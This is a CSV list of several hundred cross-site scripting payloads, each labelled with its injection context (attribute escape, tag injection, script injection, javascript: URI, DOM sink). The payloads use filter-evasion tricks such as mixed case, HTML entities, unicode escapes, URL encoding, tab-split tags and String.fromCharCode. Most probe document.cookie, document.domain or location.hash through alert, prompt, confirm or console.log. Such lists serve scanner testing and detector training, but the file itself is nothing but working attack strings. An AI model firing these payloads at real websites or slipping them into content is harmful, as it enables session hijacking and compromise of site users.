payload,context
%27 onerror=alert(document.cookie) %27,attribute_escape
"""><svg onclick=\u0061lert(document.cookie)>",tag_injection
"<svG oNbeGin=alErt(StRinG.fRomChaRCoDe(88,83,83))/>",tag_injection
' onerror=alert('XSS') ',attribute_escape
%27 onbegin=prompt(document.cookie) %27,attribute_escape
"%22 onerror=prompt(String.fromCharCode(88,83,83)) %22",attribute_escape
<script>/*/\u0061lert(1)</script>,script_injection
j&#97;vascript:prompt(document.domain),js_uri
"document.write(""<img src=x onerror=alert(document.domain)>"")",dom_sink
<svG oNfoCus=coNfiRm(LocAtiOn.HasH)/>,tag_injection
%27 onclick=console.log(1) %27,attribute_escape
"""%3E%3Csvg onfocus=prompt(1)%3E",tag_injection
"<svg onclick=prompt(String.fromCharCode(88,83,83))>",tag_injection
%3Csvg onload=console.log(document.cookie)/%3E,tag_injection
"<svg onmous&#101;&#101;nt&#101;r=confirm(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
"""><Svg onTogGle=prOmpT(dOcuMenT.dOmaIn)>",tag_injection
""" oNfoCus=coNsoLe.Log(1) """,attribute_escape
"""><svg ontoggl&#101;=consol&#101;.log(1)>",tag_injection
<svg onmouseenter=\u0061lert(location.hash)/>,tag_injection
<svg onload=confirm(%27XSS%27)>,tag_injection
%22><svg onload=console.log(location.hash)>,tag_injection
%22 onload=prompt(location.hash) %22,attribute_escape
<scRipT>//alErt(doCumEnt.coOkiE)</scRipT>,script_injection
%22 onfocus=confirm(document.cookie) autofocus=%22,attribute_escape
%3Csvg onmouseover=prompt(1)%3E,tag_injection
<scr	ipt>/x/alert(1)</scr	ipt>,script_injection
<svG oNtoGglE=pRomPt(LocAtiOn.HasH)>,tag_injection
"%22 onclick=alert(String.fromCharCode(88,83,83)) %22",attribute_escape
%27 onclick=alert(%27XSS%27) %27,attribute_escape
""" onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
"""><Svg onMouSeoVer=coNfiRm(DocUmeNt.CooKie)>",tag_injection
""" onfocus=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) &#97;utofocus=""",attribute_escape
%27 onmouseenter=confirm(%27XSS%27) %27,attribute_escape
<svg onerror=alert('XSS')/>,tag_injection
<svg onmouseenter=prompt(%27XSS%27)/>,tag_injection
%3Csvg onload=alert('XSS')/%3E,tag_injection
%22 onmouseenter=confirm(1) %22,attribute_escape
"""><svg onclick=&#97;l&#101;rt('XSS')>",tag_injection
<svg ontoggle=confirm(location.hash)>,tag_injection
<script>alert(document.domain)</script>,script_injection
j&#97;vascr	ipt:console.log('XSS'),js_uri
"""><svg onbegin=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection
"""%3E%3Csvg ontoggle=prompt(location.hash)%3E",tag_injection
<svG oNclIck=coNsoLe.Log(doCumEnt.doMaiN)>,tag_injection
<svg onlo&#97;d=consol&#101;.log('XSS')>,tag_injection
"%3Csvg onfocus=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
JavAscRipT:cOnfIrm(doCumEnt.coOkiE),js_uri
"""><svg onlo&#97;d=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"<scr	ipt>//alert(String.fromCharCode(88,83,83))</scr	ipt>",script_injection
"""><svg onmous&#101;ov&#101;r=prompt(docum&#101;nt.cooki&#101;)>",tag_injection
<svG oNfoCus=prOmpT('XSS')/>,tag_injection
"<svG oNloAd=ConFirM(STriNg.FroMChArCOde(88,83,83))/>",tag_injection
"&#101;v&#97;l(""prompt(String.fromCh&#97;rCod&#101;(88,83,83))"")",dom_sink
' onerror=\u0061lert(document.domain) ',attribute_escape
%22><svg ontoggle=alert(document.cookie)>,tag_injection
<svG oNmoUseOveR=cOnsOle.loG(dOcuMenT.cOokIe)/>,tag_injection
"setTimeout(""\u0061lert(String.fromCharCode(88,83,83))"",0)",dom_sink
<svG oNclIck=coNsoLe.Log('XSS')/>,tag_injection
%27 ontoggle=confirm(1) %27,attribute_escape
JavAscRipT:cOnfIrm(1),js_uri
"""%3E%3Csvg onload=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
"%3Csvg onmouseover=confirm(String.fromCharCode(88,83,83))/%3E",tag_injection
""" oNerRor=coNfiRm('XSS') """,attribute_escape
"document.write(""<img src=x onerror=\u0061lert('XSS')>"")",dom_sink
<scRipT>cOnfIrm('XSS')</ScrIpt>,script_injection
%3Csvg onbegin=console.log(document.cookie)/%3E,tag_injection
' onmous&#101;&#101;nt&#101;r=prompt(loc&#97;tion.h&#97;sh) ',attribute_escape
<svg ontoggl&#101;=confirm(loc&#97;tion.h&#97;sh)/>,tag_injection
""" onfocus=console.log(1) autofocus=""",attribute_escape
<svg onfocus=confirm(%27XSS%27)/>,tag_injection
"<svg ontoggle=confirm(String.fromCharCode(88,83,83))>",tag_injection
' on&#101;rror=consol&#101;.log(loc&#97;tion.h&#97;sh) ',attribute_escape
<svg ontoggl&#101;=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)/>,tag_injection
""" onmous&#101;&#101;nt&#101;r=confirm(docum&#101;nt.dom&#97;in) """,attribute_escape
""" oNloAd=AleRt(1) """,attribute_escape
<svg onclick=alert(%27XSS%27)/>,tag_injection
<svg onerror=alert(document.cookie)>,tag_injection
' oNfoCus=prOmpT(dOcuMenT.cOokIe) ',attribute_escape
"%3Cscript%3Ealert`String.fromCharCode(88,83,83)`%3C/script%3E",script_injection
"""><svg ontoggl&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection
javascript:confirm(%27XSS%27),js_uri
%22><svg onmouseover=prompt(document.cookie)>,tag_injection
' oNbeGin=coNfiRm(LocAtiOn.HasH) ',attribute_escape
%27 ontoggle=alert(%27XSS%27) %27,attribute_escape
<svg onerror=alert(document.domain)/>,tag_injection
"""%3E%3Csvg onload=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
"""><svg onb&#101;gin=&#97;l&#101;rt('XSS')>",tag_injection
"%3Csvg ontoggle=alert(String.fromCharCode(88,83,83))/%3E",tag_injection
"j&#97;v&#97;script:confirm(String.fromCh&#97;rCod&#101;(88,83,83))",js_uri
%3Cscript%3Econsole.log(1)%3C/script%3E,script_injection
<script>//consol&#101;.log(docum&#101;nt.cooki&#101;)</script>,script_injection
"<scRipT>//alErt(StRinG.fRomChaRCoDe(88,83,83))</ScrIpt>",script_injection
"' ontoggl&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
%22><svg onclick=confirm(%27XSS%27)>,tag_injection
<svg ontoggl&#101;=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>,tag_injection
"<svG oNfoCus=alErt(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
%3Csvg ontoggle=prompt(location.hash)/%3E,tag_injection
%22><svg onmouseenter=console.log(document.domain)>,tag_injection
"""><svg onb&#101;gin=confirm(loc&#97;tion.h&#97;sh)>",tag_injection
' onclick=prompt('XSS') ',attribute_escape
""" oNmoUseEntEr=ConFirM(1) """,attribute_escape
<script>/*/alert(%27XSS%27)</script>,script_injection
<scr	ipt>/x/alert(document.domain)</scr	ipt>,script_injection
<script>//prompt(docum&#101;nt.dom&#97;in)</script>,script_injection
""" oNclIck=coNfiRm(1) """,attribute_escape
""" onbegin=alert(location.hash) """,attribute_escape
' onerror=confirm(1) ',attribute_escape
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=consol&#101;.log(docum&#101;nt.dom&#97;in)>"")",dom_sink
""" onb&#101;gin=&#97;l&#101;rt('XSS') """,attribute_escape
"%3Cscript%3E/x/prompt(String.fromCharCode(88,83,83))%3C/script%3E",script_injection
<script>/*/confirm(%27XSS%27)</script>,script_injection
""" onmouseenter=console.log('XSS') """,attribute_escape
<script>confirm`1`</script>,script_injection
<svg onerror=prompt(document.cookie)>,tag_injection
<script>/*/console.log(document.cookie)</script>,script_injection
' onload=alert(1) ',attribute_escape
%3Csvg onload=console.log(document.cookie)%3E,tag_injection
"""%3E%3Csvg onerror=console.log(1)%3E",tag_injection
%3Cscript%3Econfirm(document.cookie)%3C/script%3E,script_injection
<svg onload=alert(document.domain)/>,tag_injection
<svg onload=prompt(document.domain)/>,tag_injection
<script>console.log(%27XSS%27)</script>,script_injection
' oNclIck=coNsoLe.Log(loCatIon.haSh) ',attribute_escape
<svG oNmoUseEntEr=AleRt(1)/>,tag_injection
"javascript:prompt(String.fromCharCode(88,83,83))",js_uri
%3Cscript%3E/*/prompt(document.domain)%3C/script%3E,script_injection
""" onmouseenter=alert(document.domain) """,attribute_escape
"%3Csvg onbegin=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
' onmous&#101;ov&#101;r=confirm('XSS') ',attribute_escape
"setTimeout(""\u0061lert(document.domain)"",0)",dom_sink
<svg onload=prompt(location.hash)>,tag_injection
"document.write(""%3Cimg src=x onerror=console.log(document.domain)%3E"")",dom_sink
<svG oNmoUseEntEr=ConSolE.lOg(LocAtiOn.HasH)/>,tag_injection
"javascript:\u0061lert(String.fromCharCode(88,83,83))",js_uri
%27 onbegin=console.log(location.hash) %27,attribute_escape
JavAscRipT:vOid(alErt(loCatIon.haSh)),js_uri
""" ontoggle=alert(document.domain) """,attribute_escape
"""><svg ontoggle=console.log(document.cookie)>",tag_injection
"""><svg onmous&#101;ov&#101;r=confirm(1)>",tag_injection
""" oNfoCus=alErt(1) """,attribute_escape
%3Cimg onload=alert(document.cookie)%3E,tag_injection
""" onclick=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) """,attribute_escape
' oNmoUseOveR=aLerT(1) ',attribute_escape
""" onlo&#97;d=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
<svG oNerRor=coNsoLe.Log(loCatIon.haSh)/>,tag_injection
"""%3E%3Csvg onclick=console.log(document.cookie)%3E",tag_injection
<script>consol&#101;.log`loc&#97;tion.h&#97;sh`</script>,script_injection
""" onfocus=console.log(document.cookie) autofocus=""",attribute_escape
<svg onbegin=alert(1)/>,tag_injection
' onload=\u0061lert('XSS') ',attribute_escape
"' onbegin=confirm(String.fromCharCode(88,83,83)) '",attribute_escape
"<script>/x/\u0061lert(String.fromCharCode(88,83,83))</script>",script_injection
""" onb&#101;gin=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
"document.write(""%3Cimg src=x onerror=alert(document.domain)%3E"")",dom_sink
<svg onfocus=confirm(1)>,tag_injection
""" onfocus=prompt(location.hash) autofocus=""",attribute_escape
' onb&#101;gin=confirm(1) ',attribute_escape
%27 onmouseover=console.log(%27XSS%27) %27,attribute_escape
%22><svg onfocus=console.log(document.domain)>,tag_injection
<svg onmous&#101;ov&#101;r=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)/>,tag_injection
' onfocus=console.log('XSS') ',attribute_escape
"setTimeout(""prompt(document.cookie)"",0)",dom_sink
%3Csvg onmouseenter=prompt(document.domain)%3E,tag_injection
' onmouseenter=prompt('XSS') ',attribute_escape
<svg onmouseenter=\u0061lert(document.cookie)>,tag_injection
"<svg onload=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection
<svg ontoggle=\u0061lert(location.hash)/>,tag_injection
""" onclick=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
%27 onbegin=alert(document.domain) %27,attribute_escape
<svg on&#101;rror=&#97;l&#101;rt(1)/>,tag_injection
<svG oNerRor=coNfiRm(DocUmeNt.DomAin)/>,tag_injection
"""%3E%3Csvg onclick=alert(location.hash)%3E",tag_injection
<svg onmous&#101;ov&#101;r=consol&#101;.log('XSS')/>,tag_injection
<svg onclick=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)/>,tag_injection
""" onfocus=\u0061lert(document.domain) """,attribute_escape
%3Cscript%3E/x/confirm(1)%3C/script%3E,script_injection
%27 onclick=console.log(%27XSS%27) %27,attribute_escape
"document.write(""%3Cimg src=x onerror=alert(1)%3E"")",dom_sink
""" onmouseenter=confirm('XSS') """,attribute_escape
' oNmoUseEntEr=ConSolE.lOg(LocAtiOn.HasH) ',attribute_escape
""" onfocus=confirm(document.domain) autofocus=""",attribute_escape
"j&#97;vascr	ipt:alert(String.fromCharCode(88,83,83))",js_uri
""" onlo&#97;d=prompt(1) """,attribute_escape
%22 onmouseover=console.log(location.hash) %22,attribute_escape
%3Cscript%3E/*/confirm(document.cookie)%3C/script%3E,script_injection
"<svG oNfoCus=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
document.write(%22<img src=x onerror=alert(1)>%22),dom_sink
%3Cscript%3E//prompt(location.hash)%3C/script%3E,script_injection
%22><svg onbegin=console.log(document.domain)>,tag_injection
"""><svg onclick=consol&#101;.log(1)>",tag_injection
<imG oNloAd=ProMpt(1)/>,tag_injection
<scr	ipt>/x/alert(document.cookie)</scr	ipt>,script_injection
<svg onfocus=prompt(document.domain)>,tag_injection
"""><Svg onCliCk=ConSolE.lOg(DocUmeNt.DomAin)>",tag_injection
%3Csvg onmouseover=console.log(document.cookie)%3E,tag_injection
%27 onfocus=console.log(document.domain) %27,attribute_escape
<svg onmouseover=alert(1)/>,tag_injection
%3Csvg onload=confirm(document.cookie)/%3E,tag_injection
%22 onfocus=alert(1) %22,attribute_escape
""" oNloAd=ConFirM(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape
""" onmouseenter=confirm(location.hash) """,attribute_escape
<svg onb&#101;gin=consol&#101;.log(1)/>,tag_injection
"""><svg onfocus=confirm('XSS')>",tag_injection
<svG oNerRor=alErt(loCatIon.haSh)>,tag_injection
<svG oNloAd=ConFirM(dOcuMenT.cOokIe)/>,tag_injection
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=cOnsOle.loG(dOcuMenT.dOmaIn)>"")",dom_sink
' oNmoUseEntEr=AleRt(DocUmeNt.CooKie) ',attribute_escape
"""><Svg onMouSeeNteR=pRomPt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
' onbegin=alert(document.domain) ',attribute_escape
""" onmous&#101;&#101;nt&#101;r=consol&#101;.log(docum&#101;nt.dom&#97;in) """,attribute_escape
' onclick=consol&#101;.log(docum&#101;nt.cooki&#101;) ',attribute_escape
%3Cscript%3E//confirm(location.hash)%3C/script%3E,script_injection
<svg ontoggl&#101;=&#97;l&#101;rt(1)/>,tag_injection
""" oNfoCus=prOmpT(1) aUtoFocUs=""",attribute_escape
""" oNfoCus=coNfiRm(1) """,attribute_escape
<svg onmouseover=confirm(document.domain)/>,tag_injection
' oNerRor=coNsoLe.Log(doCumEnt.coOkiE) ',attribute_escape
""" onclick=&#97;l&#101;rt(docum&#101;nt.cooki&#101;) """,attribute_escape
"""><img onload=\u0061lert(document.domain)>",tag_injection
""" oNloAd=ProMpt(doCumEnt.coOkiE) """,attribute_escape
"<svg onload=alert(String.fromCharCode(88,83,83))/>",tag_injection
""" ontoggle=prompt(location.hash) """,attribute_escape
' onclick=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape
' ontoggl&#101;=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape
' oNfoCus=coNfiRm('XSS') ',attribute_escape
<svg onclick=consol&#101;.log(docum&#101;nt.cooki&#101;)/>,tag_injection
<svg onload=confirm(location.hash)/>,tag_injection
<scRipT>/*/aLerT(dOcuMenT.cOokIe)</sCriPt>,script_injection
%22 ontoggle=prompt(%27XSS%27) %22,attribute_escape
%3Cscript%3E/x/prompt(document.domain)%3C/script%3E,script_injection
%3Csvg onfocus=confirm('XSS')%3E,tag_injection
"<svg onload=confirm(String.fromCharCode(88,83,83))/>",tag_injection
"""%3E%3Csvg onclick=alert(document.domain)%3E",tag_injection
""" onfocus=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) &#97;utofocus=""",attribute_escape
"%22 onmouseover=console.log(String.fromCharCode(88,83,83)) %22",attribute_escape
"<scr	ipt>confirm(String.fromCharCode(88,83,83))</scr	ipt>",script_injection
"SetTimEouT(""AleRt(1)"",0)",dom_sink
"<svG oNfoCus=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))/>",tag_injection
%22><svg onclick=confirm(location.hash)>,tag_injection
<svG oNfoCus=alErt(doCumEnt.coOkiE)/>,tag_injection
' oNbeGin=coNsoLe.Log(doCumEnt.doMaiN) ',attribute_escape
""" onload=confirm(String.fromCharCode(88,83,83)) """,attribute_escape
%3Csvg ontoggle=confirm(document.domain)/%3E,tag_injection
' onload=\u0061lert(1) ',attribute_escape
%3Csvg onerror=console.log(location.hash)/%3E,tag_injection
""" ontoggl&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh) """,attribute_escape
"""><svg onmouseover=alert(document.cookie)>",tag_injection
"""><svg onerror=confirm(document.domain)>",tag_injection
"<svG oNloAd=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))/>",tag_injection
%22><svg onclick=alert(document.cookie)>,tag_injection
' ontoggle=confirm('XSS') ',attribute_escape
%22><svg onerror=alert(document.domain)>,tag_injection
<scr	ipt>/x/console.log(location.hash)</scr	ipt>,script_injection
<script>console.log`'XSS'`</script>,script_injection
"""><svg onmouseenter=confirm(String.fromCharCode(88,83,83))>",tag_injection
""" onfocus=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
<svg onclick=consol&#101;.log(docum&#101;nt.cooki&#101;)>,tag_injection
<svg onbegin=prompt(document.cookie)>,tag_injection
""" oNclIck=coNsoLe.Log('XSS') """,attribute_escape
"&#101;v&#97;l(""&#97;l&#101;rt('XSS')"")",dom_sink
<script>//confirm(document.cookie)</script>,script_injection
<svG oNmoUseEntEr=ProMpt(loCatIon.haSh)/>,tag_injection
"%22><svg onbegin=prompt(String.fromCharCode(88,83,83))>",tag_injection
javascr	ipt:void(confirm(location.hash)),js_uri
%22 onfocus=prompt(document.domain) autofocus=%22,attribute_escape
<svg onclick=console.log(%27XSS%27)>,tag_injection
%27 onclick=confirm(%27XSS%27) %27,attribute_escape
"""><svg onload=console.log(document.domain)>",tag_injection
<svg ontoggle=alert(location.hash)>,tag_injection
"""><svg onclick=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection
"<svg onload=confirm(String.fromCharCode(88,83,83))>",tag_injection
<svg onclick=console.log(document.cookie)/>,tag_injection
%27 onerror=confirm(location.hash) %27,attribute_escape
"setTimeout(""prompt(1)"",0)",dom_sink
""" oNloAd=ProMpt(1) """,attribute_escape
"""><svg ontoggle=\u0061lert(document.cookie)>",tag_injection
' ontoggle=confirm(document.domain) ',attribute_escape
"""><img onlo&#97;d=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection
"""%3E%3Cimg onload=alert('XSS')%3E",tag_injection
<scRipT>//alErt(doCumEnt.doMaiN)</scRipT>,script_injection
%22><svg onerror=alert(1)>,tag_injection
"<svG oNclIck=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
<svg onfocus=consol&#101;.log(1)/>,tag_injection
%27 onmouseenter=confirm(document.cookie) %27,attribute_escape
<svg onbegin=console.log(document.domain)/>,tag_injection
<svG oNtoGglE=pRomPt('XSS')/>,tag_injection
%22><svg ontoggle=console.log(location.hash)>,tag_injection
""" oNtoGglE=pRomPt(DocUmeNt.CooKie) """,attribute_escape
""" onfocus=\u0061lert(1) """,attribute_escape
"%22 onclick=console.log(String.fromCharCode(88,83,83)) %22",attribute_escape
""" oNfoCus=coNsoLe.Log('XSS') aUtoFocUs=""",attribute_escape
""" ontoggle=alert(String.fromCharCode(88,83,83)) """,attribute_escape
"document.write(""%3Cimg src=x onerror=alert(document.cookie)%3E"")",dom_sink
"<svg onclick=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
<svg onmous&#101;ov&#101;r=confirm('XSS')/>,tag_injection
<script>consol&#101;.log(docum&#101;nt.dom&#97;in)</script>,script_injection
javascr	ipt:void(prompt(1)),js_uri
<scRipT>aLerT('XSS')</scRipT>,script_injection
%22><svg onfocus=confirm(1)>,tag_injection
"""><Svg onMouSeoVer=alErt(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
<scr	ipt>/x/prompt('XSS')</scr	ipt>,script_injection
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=&#97;l&#101;rt('XSS')>"")",dom_sink
"""><svg onbegin=confirm(location.hash)>",tag_injection
"eval(""alert(document.domain)"")",dom_sink
<scr	ipt>prompt`document.cookie`</scr	ipt>,script_injection
%3Csvg onbegin=alert(location.hash)/%3E,tag_injection
<svg onmouseenter=confirm(%27XSS%27)/>,tag_injection
<script>/*/console.log(location.hash)</script>,script_injection
%22 onclick=confirm(document.domain) %22,attribute_escape
"""><svg onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>",tag_injection
"<svg onload=prompt(String.fromCharCode(88,83,83))/>",tag_injection
"setTimeout(""prompt('XSS')"",0)",dom_sink
' onclick=confirm(document.domain) ',attribute_escape
"document.write(""<img src=x onerror=prompt(String.fromCharCode(88,83,83))>"")",dom_sink
<script>consol&#101;.log`1`</script>,script_injection
%27 onmouseenter=alert(%27XSS%27) %27,attribute_escape
<svg ontoggl&#101;=confirm('XSS')/>,tag_injection
' onmouseenter=prompt(document.domain) ',attribute_escape
j&#97;v&#97;script:void(consol&#101;.log(1)),js_uri
"<scRipT>cOnsOle.loG`STriNg.FroMChArCOde(88,83,83)`</scRipT>",script_injection
"JavAscRipT:vOid(coNfiRm(StrIng.frOmCHarCodE(88,83,83)))",js_uri
<svg onerror=confirm(1)/>,tag_injection
"<script>/x/&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection
"""><Svg onLoaD=aLerT(dOcuMenT.dOmaIn)>",tag_injection
' onmouseenter=console.log(document.cookie) ',attribute_escape
